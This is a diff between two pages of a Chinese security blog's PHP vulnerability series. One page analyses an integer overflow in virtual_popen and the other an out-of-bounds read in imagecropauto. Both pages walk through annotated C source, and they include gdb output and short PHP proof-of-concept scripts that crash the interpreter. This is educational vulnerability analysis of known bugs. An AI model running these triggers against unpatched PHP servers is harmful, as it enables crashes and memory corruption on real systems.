@@ -85,19 +85,16 @@
 
 
 
-<meta name="description" content="Heap-based integer overflow(php漏洞挖掘系列之二)0x01 前言这个漏洞是玄武实验室的人挖出来的，我这边做一下分享吧。我们不是漏洞挖掘者，只是漏洞搬运者。好了，进入正题吧，这篇文章主要讲述的是基于堆的缓冲区溢出，找了好久终于找到一个比较简单易懂的漏洞进行分析。
-0x02 漏洞分析首先放代码，这段代码在zend_virtual_cwd.c的1853行，可以看出是unix">
+<meta name="description" content="Out of bounds (php漏洞挖掘系列三)0x01 前言看标题就知道了是数组越界的漏洞，本次要说的是数组越界的漏洞，参考的文章已经写得很清楚了，不过是我把我自己的理解以中文的方式表达出来而已。说来奇怪不知道为什么这个漏洞没上CVE。说个挖数组越界漏洞搞得小技巧，搜索”[“这个数组符号，然后对于出来的结果一个个的去审查吧，不过目前已经很难挖出来了，因为我已经亲自尝试过来，然而就是挖不出来，">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Heap-based buffer overflow">
-<meta property="og:url" content="http://yoursite.com/2017/02/17/Heap-based-buffer-overflow/index.html">
+<meta property="og:title" content="Out of bounds access">
+<meta property="og:url" content="http://yoursite.com/2017/02/18/Out-of-bounds-access/index.html">
 <meta property="og:site_name" content="hackyzh'blog">
-<meta property="og:description" content="Heap-based integer overflow(php漏洞挖掘系列之二)0x01 前言这个漏洞是玄武实验室的人挖出来的，我这边做一下分享吧。我们不是漏洞挖掘者，只是漏洞搬运者。好了，进入正题吧，这篇文章主要讲述的是基于堆的缓冲区溢出，找了好久终于找到一个比较简单易懂的漏洞进行分析。
-0x02 漏洞分析首先放代码，这段代码在zend_virtual_cwd.c的1853行，可以看出是unix">
-<meta property="og:updated_time" content="2017-02-17T14:25:34.000Z">
+<meta property="og:description" content="Out of bounds (php漏洞挖掘系列三)0x01 前言看标题就知道了是数组越界的漏洞，本次要说的是数组越界的漏洞，参考的文章已经写得很清楚了，不过是我把我自己的理解以中文的方式表达出来而已。说来奇怪不知道为什么这个漏洞没上CVE。说个挖数组越界漏洞搞得小技巧，搜索”[“这个数组符号，然后对于出来的结果一个个的去审查吧，不过目前已经很难挖出来了，因为我已经亲自尝试过来，然而就是挖不出来，">
+<meta property="og:updated_time" content="2017-02-18T08:02:26.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Heap-based buffer overflow">
-<meta name="twitter:description" content="Heap-based integer overflow(php漏洞挖掘系列之二)0x01 前言这个漏洞是玄武实验室的人挖出来的，我这边做一下分享吧。我们不是漏洞挖掘者，只是漏洞搬运者。好了，进入正题吧，这篇文章主要讲述的是基于堆的缓冲区溢出，找了好久终于找到一个比较简单易懂的漏洞进行分析。
-0x02 漏洞分析首先放代码，这段代码在zend_virtual_cwd.c的1853行，可以看出是unix">
+<meta name="twitter:title" content="Out of bounds access">
+<meta name="twitter:description" content="Out of bounds (php漏洞挖掘系列三)0x01 前言看标题就知道了是数组越界的漏洞，本次要说的是数组越界的漏洞，参考的文章已经写得很清楚了，不过是我把我自己的理解以中文的方式表达出来而已。说来奇怪不知道为什么这个漏洞没上CVE。说个挖数组越界漏洞搞得小技巧，搜索”[“这个数组符号，然后对于出来的结果一个个的去审查吧，不过目前已经很难挖出来了，因为我已经亲自尝试过来，然而就是挖不出来，">
 
 
 
@@ -118,9 +115,9 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/02/17/Heap-based-buffer-overflow/"/>
+  <link rel="canonical" href="http://yoursite.com/2017/02/18/Out-of-bounds-access/"/>
 
-  <title> Heap-based buffer overflow | hackyzh'blog </title>
+  <title> Out of bounds access | hackyzh'blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -283,7 +280,7 @@
             
             
               
-                Heap-based buffer overflow
+                Out of bounds access
               
             
           </h1>
@@ -295,8 +292,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2017-02-17T22:22:29+08:00" content="2017-02-17">
-              2017-02-17
+            <time itemprop="dateCreated" datetime="2017-02-18T16:00:22+08:00" content="2017-02-18">
+              2017-02-18
             </time>
           </span>
 
@@ -306,8 +303,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2017/02/17/Heap-based-buffer-overflow/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/02/17/Heap-based-buffer-overflow/" itemprop="commentsCount"></span>
+                <a href="/2017/02/18/Out-of-bounds-access/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/02/18/Out-of-bounds-access/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -332,13 +329,16 @@
       
 
       
-        <h1 id="Heap-based-integer-overflow-php漏洞挖掘系列之二"><a href="#Heap-based-integer-overflow-php漏洞挖掘系列之二" class="headerlink" title="Heap-based integer overflow(php漏洞挖掘系列之二)"></a>Heap-based integer overflow(php漏洞挖掘系列之二)</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>这个漏洞是玄武实验室的人挖出来的，我这边做一下分享吧。我们不是漏洞挖掘者，只是漏洞搬运者。好了，进入正题吧，这篇文章主要讲述的是基于堆的缓冲区溢出，找了好久终于找到一个比较简单易懂的漏洞进行分析。</p>
-<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>首先放代码，这段代码在zend_virtual_cwd.c的1853行，可以看出是unix环境使用的函数。然而没啥卵用。这个函数是执行命令的底层调用函数，具体我就不往上找了麻烦，从代码中就可以大致看的出来。php执行命令的函数还是挺多的，我就不列举了，在poc中我用的是system函数。然后就进入漏洞分析环节了。请看代码注释。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">#else /* Unix */</div><div class="line">CWD_API FILE *virtual_popen(const char *command, const char *type) /* &#123;&#123;&#123; */</div><div class="line">&#123;</div><div class="line">	int command_length;  //int型的长度在32位中为0x7fffffff</div><div class="line">	int dir_length, extra = 0;</div><div class="line">	char *command_line;</div><div class="line">	char *ptr, *dir;</div><div class="line">	FILE *retval;</div><div class="line"></div><div class="line">	command_length = strlen(command);  //这里统计命令的字符串长度，</div><div class="line"></div><div class="line">	dir_length = CWDG(cwd).cwd_length; </div><div class="line">	dir = CWDG(cwd).cwd;</div><div class="line">	while (dir_length &gt; 0) &#123;</div><div class="line">		if (*dir == &apos;\&apos;&apos;) extra+=3;</div><div class="line">		dir++;</div><div class="line">		dir_length--;</div><div class="line">	&#125;</div><div class="line">	dir_length = CWDG(cwd).cwd_length;//脚本路径的长度</div><div class="line">	dir = CWDG(cwd).cwd;</div><div class="line"></div><div class="line">	ptr = command_line = (char *) emalloc(command_length + sizeof(&quot;cd &apos;&apos; ; &quot;) + dir_length + extra+1+1);  //这边变成了emalloc(0)，等会看调试信息</div><div class="line">	if (!command_line) &#123;</div><div class="line">		return NULL;</div><div class="line">	&#125;</div><div class="line">	memcpy(ptr, &quot;cd &quot;, sizeof(&quot;cd &quot;)-1);</div><div class="line">	ptr += sizeof(&quot;cd &quot;)-1;</div><div class="line"></div><div class="line">	if (CWDG(cwd).cwd_length == 0) &#123;</div><div class="line">		*ptr++ = DEFAULT_SLASH;</div><div class="line">	&#125; else &#123;</div><div class="line">		*ptr++ = &apos;\&apos;&apos;;</div><div class="line">		while (dir_length &gt; 0) &#123;</div><div class="line">			switch (*dir) &#123;</div><div class="line">			case &apos;\&apos;&apos;:</div><div class="line">				*ptr++ = &apos;\&apos;&apos;;</div><div class="line">				*ptr++ = &apos;\\&apos;;</div><div class="line">				*ptr++ = &apos;\&apos;&apos;;</div><div class="line">				/* fall-through */</div><div class="line">			default:</div><div class="line">				*ptr++ = *dir;</div><div class="line">			&#125;</div><div class="line">			dir++;</div><div class="line">			dir_length--;</div><div class="line">		&#125;</div><div class="line">		*ptr++ = &apos;\&apos;&apos;;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	*ptr++ = &apos; &apos;;</div><div class="line">	*ptr++ = &apos;;&apos;;</div><div class="line">	*ptr++ = &apos; &apos;;</div><div class="line"></div><div class="line">	memcpy(ptr, command, command_length+1);  //这里command_length+1=0xfffffff1 大于申请的堆空间，所以复制后造成溢出</div><div class="line">	retval = popen(command_line, type);</div><div class="line"></div><div class="line">	efree(command_line);</div><div class="line">	return retval;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>gdb调试信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">root@mhn:~# gdb -q --args php-7.0.2/sapi/cli/php -n test.php </div><div class="line">Reading symbols from php-7.0.2/sapi/cli/php...done.</div><div class="line">(gdb) b zend_virtual_cwd.c:1873</div><div class="line">Breakpoint 1 at 0x84d8b4: file /root/php-7.0.2/Zend/zend_virtual_cwd.c, line 1873.</div><div class="line">(gdb) b zend_virtual_cwd.c:1904</div><div class="line">Breakpoint 2 at 0x84d979: file /root/php-7.0.2/Zend/zend_virtual_cwd.c, line 1904.</div><div class="line">(gdb) r</div><div class="line">Starting program: /root/php-7.0.2/sapi/cli/php -n test.php</div><div class="line">[Thread debugging using libthread_db enabled]</div><div class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</div><div class="line"></div><div class="line">Breakpoint 1, virtual_popen (</div><div class="line">    command=command@entry=0x7ffef1200018 &apos;/&apos; &lt;repeats 200 times&gt;..., </div><div class="line">    type=type@entry=0xae66bb &quot;r&quot;) at /root/php-7.0.2/Zend/zend_virtual_cwd.c:1873</div><div class="line">1873		ptr = command_line = (char *) emalloc(command_length + sizeof(&quot;cd &apos;&apos; ; &quot;) + dir_length + extra+1+1);</div><div class="line">(gdb) p command_length</div><div class="line">$1 = -16</div><div class="line">(gdb) p sizeof(&quot;cd &apos;&apos; ; &quot;)</div><div class="line">$2 = 9</div><div class="line">(gdb) p dir_length</div><div class="line">$3 = 5</div><div class="line">(gdb) p extra</div><div class="line">$4 = 0    //可以看到这边加起来为0，其实这样比较容易理解。</div><div class="line"></div><div class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line"></div><div class="line">Breakpoint 2, virtual_popen (</div><div class="line">    command=command@entry=0x7ffef1200018 &apos;/&apos; &lt;repeats 200 times&gt;..., </div><div class="line">    type=type@entry=0xae66bb &quot;r&quot;) at /root/php-7.0.2/Zend/zend_virtual_cwd.c:1904</div><div class="line">1904		memcpy(ptr, command, command_length+1);</div><div class="line">(gdb) p command_length+1</div><div class="line">$5 = -15</div><div class="line">(gdb) n</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">__memcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:152</div><div class="line">152	../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S: No such file or directory.</div></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&lt;?php</div><div class="line">    ini_set(&apos;memory_limit&apos;, -1);</div><div class="line">    $cmd = str_repeat(&quot;/&quot;, 0xfffffff0);</div><div class="line">    system($cmd);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<p>我想看到这里也看明白了，正是因为command_length的类型为int，后面再malloc中又转化size_t类型，然后整数溢出了。poc也就那样，很容易理解。不过在linux上的exp还没怎么学习过，后续可能会学习一下。</p>
-<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>这种漏洞现在感觉也很难挖，我看了好几天都没找出一个漏洞，也许因为功力不够吧。如果本章内容讲解错误，欢迎指出。我qq499671216。</p>
-<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://bugs.php.net/bug.php?id=73025" target="_blank" rel="external">https://bugs.php.net/bug.php?id=73025</a></p>
+        <h1 id="Out-of-bounds-php漏洞挖掘系列三"><a href="#Out-of-bounds-php漏洞挖掘系列三" class="headerlink" title="Out of bounds (php漏洞挖掘系列三)"></a>Out of bounds (php漏洞挖掘系列三)</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>看标题就知道了是数组越界的漏洞，本次要说的是数组越界的漏洞，参考的文章已经写得很清楚了，不过是我把我自己的理解以中文的方式表达出来而已。说来奇怪不知道为什么这个漏洞没上CVE。说个挖数组越界漏洞搞得小技巧，搜索”[“这个数组符号，然后对于出来的结果一个个的去审查吧，不过目前已经很难挖出来了，因为我已经亲自尝试过来，然而就是挖不出来，哈哈。</p>
+<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>不过说废话，直接上函数代码。这次我们逆向思维分析，不是逆向工程那个逆向哈。</p>
+<p>看到下面的这段代码没，这里如果不是真彩色的话，就调用后面(im)-&gt;red[(c)，所以等会创建颜色的时候要注意。这里的颜色最大值为256。这里我就不放代码了，自己搜索吧，在gdImagePtrzh这个类型的结构体里面。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#define gdImageRed(im, c) ((im)-&gt;trueColor ? gdTrueColorGetRed(c) : \</div><div class="line">	(im)-&gt;red[(c)])</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">static int gdColorMatch(gdImagePtr im, int col1, int col2, float threshold)</div><div class="line">&#123;</div><div class="line">	const int dr = gdImageRed(im, col1) - gdImageRed(im, col2); //这里往下都造成了数组越界的问题。</div><div class="line">	const int dg = gdImageGreen(im, col1) - gdImageGreen(im, col2);  </div><div class="line">	const int db = gdImageBlue(im, col1) - gdImageBlue(im, col2);</div><div class="line">	const int da = gdImageAlpha(im, col1) - gdImageAlpha(im, col2);</div><div class="line">	const double dist = sqrt(dr * dr + dg * dg + db * db + da * da);</div><div class="line">	const double dist_perc = sqrt(dist / (255^2 + 255^2 + 255^2));</div><div class="line">	return (dist_perc &lt;= threshold);</div><div class="line">	//return (100.0 * dist / 195075) &lt; threshold;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>然后网上搜索，调用这个函数的如果检查不到位的话都会触发漏洞，然后下面这个函数调用了gdColorMatach。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">gdImagePtr gdImageCropThreshold(gdImagePtr im, const unsigned int color, const float threshold)</div><div class="line">&#123;</div><div class="line">	const int width = gdImageSX(im);</div><div class="line">	const int height = gdImageSY(im);</div><div class="line"></div><div class="line">	int x,y;</div><div class="line">	int match;</div><div class="line">	gdRect crop;</div><div class="line"></div><div class="line">	crop.x = 0;</div><div class="line">	crop.y = 0;</div><div class="line">	crop.width = 0;</div><div class="line">	crop.height = 0;</div><div class="line"></div><div class="line">	/* Pierre: crop everything sounds bad */</div><div class="line">	if (threshold &gt; 1.0) &#123;</div><div class="line">		return NULL;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	/* TODO: Add gdImageGetRowPtr and works with ptr at the row level</div><div class="line">	 * for the true color and palette images</div><div class="line">	 * new formats will simply work with ptr</div><div class="line">	 */</div><div class="line">	match = 1;</div><div class="line">	for (y = 0; match &amp;&amp; y &lt; height; y++) &#123;</div><div class="line">		for (x = 0; match &amp;&amp; x &lt; width; x++) &#123;</div><div class="line">			match = (gdColorMatch(im, color, gdImageGetPixel(im, x,y), threshold)) &gt; 0;</div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
+<p>然后再搜索哪个函数调用了这个代码，最终定位到顶层函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">PHP_FUNCTION(imagecropauto)</div><div class="line">&#123;</div><div class="line">	zval *IM;</div><div class="line">	zend_long mode = -1;</div><div class="line">	zend_long color = -1;</div><div class="line">	double threshold = 0.5f;</div><div class="line">	gdImagePtr im;</div><div class="line">	gdImagePtr im_crop;</div><div class="line"></div><div class="line">	if (zend_parse_parameters(ZEND_NUM_ARGS(), &quot;r|ldl&quot;, &amp;IM, &amp;mode, &amp;threshold, &amp;color) == FAILURE)  &#123;</div><div class="line">		return;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	if ((im = (gdImagePtr)zend_fetch_resource(Z_RES_P(IM), &quot;Image&quot;, le_gd)) == NULL) &#123;</div><div class="line">		RETURN_FALSE;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	switch (mode) &#123;</div><div class="line">		case -1:</div><div class="line">			mode = GD_CROP_DEFAULT;</div><div class="line">		case GD_CROP_DEFAULT:</div><div class="line">		case GD_CROP_TRANSPARENT:</div><div class="line">		case GD_CROP_BLACK:</div><div class="line">		case GD_CROP_WHITE:</div><div class="line">		case GD_CROP_SIDES:</div><div class="line">			im_crop = gdImageCropAuto(im, mode);</div><div class="line">			break;</div><div class="line"></div><div class="line">		case GD_CROP_THRESHOLD:</div><div class="line">			if (color &lt; 0) &#123;</div><div class="line">				php_error_docref(NULL, E_WARNING, &quot;Color argument missing with threshold mode&quot;);  //这里做了检查然后没啥卵用。</div><div class="line">				RETURN_FALSE;</div><div class="line">			&#125;</div><div class="line">			im_crop = gdImageCropThreshold(im, color, (float) threshold);  //这里调用了这个函数</div><div class="line">			break;</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$image=imagecreate(1000,1020);</div><div class="line">var_dump(imagecropauto($image,IMG_CROP_THRESHOLD,1,8888888));</div></pre></td></tr></table></figure>
+<p>我发现了一个奇怪的问题就是，color的数值小一点就会报错，看函数也没调用overflow这个区做安全检查，不知道是哪里出问题了。调试信息放不放都无所谓了。</p>
+<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>本来想找个有趣的数组越界的问题，我记忆中中sqrt函数造成的问题，传进去负数之后会颠倒位置，就造成了最后的结果过大造成数组越界，最终找来找去还是没找到。只能用这个函数做案例了。终于要到驾照上课去了，这边文章就写到这里吧，有问题欢迎指出。</p>
+<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://bugs.php.net/bug.php?id=72494" target="_blank" rel="external">https://bugs.php.net/bug.php?id=72494</a></p>
 
       
     </div>
@@ -385,17 +385,13 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/02/16/stack-based-integer-overflow/" rel="next" title="stack-based integer overflow">
-                <i class="fa fa-chevron-left"></i> stack-based integer overflow
+              <a href="/2017/02/17/Heap-based-buffer-overflow/" rel="next" title="Heap-based buffer overflow">
+                <i class="fa fa-chevron-left"></i> Heap-based buffer overflow
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/02/18/Out-of-bounds-access/" rel="prev" title="Out of bounds access">
-                Out of bounds access <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -410,10 +406,10 @@
 
     <div class="post-spread">
       
-        <div class="ds-share flat" data-thread-key="2017/02/17/Heap-based-buffer-overflow/"
-     data-title="Heap-based buffer overflow"
+        <div class="ds-share flat" data-thread-key="2017/02/18/Out-of-bounds-access/"
+     data-title="Out of bounds access"
      data-content=""
-     data-url="http://yoursite.com/2017/02/17/Heap-based-buffer-overflow/">
+     data-url="http://yoursite.com/2017/02/18/Out-of-bounds-access/">
   <div class="ds-share-inline">
     <ul  class="ds-share-icons-16">
 
@@ -440,8 +436,8 @@
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2017/02/17/Heap-based-buffer-overflow/"
-           data-title="Heap-based buffer overflow" data-url="http://yoursite.com/2017/02/17/Heap-based-buffer-overflow/">
+      <div class="ds-thread" data-thread-key="2017/02/18/Out-of-bounds-access/"
+           data-title="Out of bounds access" data-url="http://yoursite.com/2017/02/18/Out-of-bounds-access/">
       </div>
     
   </div>
@@ -578,7 +574,7 @@
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Heap-based-integer-overflow-php漏洞挖掘系列之二"><span class="nav-number">1.</span> <span class="nav-text">Heap-based integer overflow(php漏洞挖掘系列之二)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-前言"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-漏洞分析"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-小结"><span class="nav-number">1.3.</span> <span class="nav-text">0x03 小结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#参考资料"><span class="nav-number">1.3.1.</span> <span class="nav-text">参考资料</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Out-of-bounds-php漏洞挖掘系列三"><span class="nav-number">1.</span> <span class="nav-text">Out of bounds (php漏洞挖掘系列三)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-前言"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-漏洞分析"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-小结"><span class="nav-number">1.3.</span> <span class="nav-text">0x03 小结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#参考资料"><span class="nav-number">1.3.1.</span> <span class="nav-text">参考资料</span></a></li></ol></li></ol></li></ol></div>
             
           </div>
         </section>
